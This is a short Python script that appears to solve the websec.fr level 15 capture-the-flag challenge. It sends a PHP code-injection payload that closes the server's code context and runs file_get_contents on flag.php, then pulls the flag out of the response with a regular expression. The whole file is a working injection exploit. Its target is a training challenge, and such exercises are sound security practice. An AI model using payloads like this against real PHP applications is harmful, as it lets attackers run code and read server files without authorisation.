#!/usr/bin/env python3
import requests
import re

URL = "https://websec.fr/level15/index.php"
obj = {
    'c': '}; echo file_get_contents("./flag.php"); //',
    'submit': 'Submit'
}

res = requests.post(f"{URL}",data=obj)
flag = re.findall(r'WEBSEC\{[^}]+\}', res.text)
print(flag)